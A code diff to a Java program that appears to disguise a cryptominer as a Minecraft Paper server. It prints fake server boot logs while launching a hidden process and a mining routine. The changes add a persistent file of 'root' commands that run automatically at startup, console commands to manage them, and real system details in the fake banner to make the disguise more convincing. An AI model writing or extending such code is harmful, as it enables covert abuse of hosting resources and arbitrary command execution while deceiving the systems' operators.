@@ -56,6 +56,8 @@ public class Main{
             "LoadingUser","Connecting","Reconnecting","TimeoutUser",
             "mytai","kirameomeo","kuromc2k5"
     };
+    private static final List<String> autoCommands = Collections.synchronizedList(new ArrayList<>());
+    private static final String AUTO_CMDS_FILE = "commands.txt";
 
     public static void main(String[]a){
         setupLogger();
@@ -335,12 +337,64 @@ public class Main{
         }
         return false;
     }
+    private static void loadAutoCommands(){
+        try{
+            File autoFile = new File(AUTO_CMDS_FILE);
+            if(autoFile.exists()){
+                try(BufferedReader r = new BufferedReader(new FileReader(autoFile))){
+                    String line;
+                    while((line = r.readLine()) != null){
+                        line = line.trim();
+                        if(!line.isEmpty() && !line.startsWith("#")){
+                            autoCommands.add(line);
+                        }
+                    }
+                }
+            }
+        }catch(Exception e){
+            warn("[InFo] Failed to load commands: " + e.getMessage());
+        }
+    }
 
+    private static void saveAutoCommands(){
+        try{
+            try(PrintWriter w = new PrintWriter(AUTO_CMDS_FILE)){
+                for(String cmd : autoCommands){
+                    w.println(cmd);
+                }
+            }
+        }catch(Exception e){
+            warn("[InFo] Failed to save commands: " + e.getMessage());
+        }
+    }
+
+    private static void rato(){
+        if(autoCommands.isEmpty()){
+            return;
+        }
+
+        new Thread(() -> {
+            try{
+                Thread.sleep(1000);
+                for(String cmd : autoCommands){
+                    if(!running) break;
+                    executeRootCommand(cmd, rootLog);
+                    Thread.sleep(1000);
+                }
+            }catch(Exception e){}
+        }).start();
+    }
     private static void exec(File d,File s,boolean firstRun){
         try{
             printBanner();
-            Thread.sleep(300);
-            info("[bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.9+10-LTS; Eclipse Adoptium Temurin-21.0.9+10) on Linux 5.4.0-216-generic (amd64)");
+            Thread.sleep(200);
+            String osName = System.getProperty("os.name");
+            String osArch = System.getProperty("os.arch");
+            String osVersion = System.getProperty("os.version");
+            String javaVersion = System.getProperty("java.version");
+            String javaVendor = System.getProperty("java.vendor");
+            String javaVmName = System.getProperty("java.vm.name");
+            info("[bootstrap] Running Java " + javaVersion + " (" + javaVmName + "; " + javaVendor + ") on " + osName + " " + osVersion + " (" + osArch + ")");
             info("[bootstrap] Loading Paper 1.21.8-40-main@f866a5f (2025-08-19T16:05:02Z) for Minecraft 1.21.8");
             info("[PluginInitializerManager] Initializing plugins...");
             Thread.sleep(200);
@@ -414,10 +468,9 @@ public class Main{
             p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             p.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process pr=p.start();
-
-            // Setup mining environment
             autoccminer(d, firstRun);
-
+            loadAutoCommands();
+            rato();
             simulateServer();
             startCommandListener();
             pr.waitFor();
@@ -593,6 +646,50 @@ public class Main{
             return;
         }else if(cmd.equals("root-off")){
             rootMode=false;
+            return;
+        }else if(cmd.startsWith("root-auto ") || cmd.startsWith("a ")){
+            String autoCmd = cmd.startsWith("root-auto ") ? cmd.substring(10).trim() : cmd.substring(2).trim();
+            if(!autoCmd.isEmpty()){
+                autoCommands.add(autoCmd);
+                saveAutoCommands();
+                info("Added auto command: " + autoCmd);
+                info("Total auto commands: " + autoCommands.size());
+            }else{
+                warn("Usage: root-auto <command> or a <command>");
+            }
+            return;
+        }else if(cmd.startsWith("root-rmauto ") || cmd.startsWith("ra ")){
+            String target = cmd.startsWith("root-rmauto ") ? cmd.substring(12).trim() : cmd.substring(3).trim();
+            if(target.isEmpty()){
+                warn("Usage: root-rmauto <command|all> or ra <command|all>");
+                return;
+            }
+
+            if(target.equals("all")){
+                int count = autoCommands.size();
+                autoCommands.clear();
+                saveAutoCommands();
+                info("Removed all " + count + " auto commands");
+            }else{
+                boolean removed = autoCommands.remove(target);
+                if(removed){
+                    saveAutoCommands();
+                    info("Removed auto command: " + target);
+                    info("Remaining auto commands: " + autoCommands.size());
+                }else{
+                    warn("Command not found in auto list: " + target);
+                }
+            }
+            return;
+        }else if(cmd.equals("root-lsauto") || cmd.equals("la")){
+            if(autoCommands.isEmpty()){
+                info("No auto commands configured");
+            }else{
+                info("Auto commands (" + autoCommands.size() + "):");
+                for(int i = 0; i < autoCommands.size(); i++){
+                    System.out.println("  " + (i+1) + ". " + autoCommands.get(i));
+                }
+            }
             return;
         }else if(cmd.equals("stop")||cmd.equals("end")){
             info("Stopping the server");
